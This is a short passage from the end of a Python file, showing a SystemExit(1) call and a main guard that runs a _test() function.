        raise SystemExit(1)


if __name__ == "__main__":
    _test()
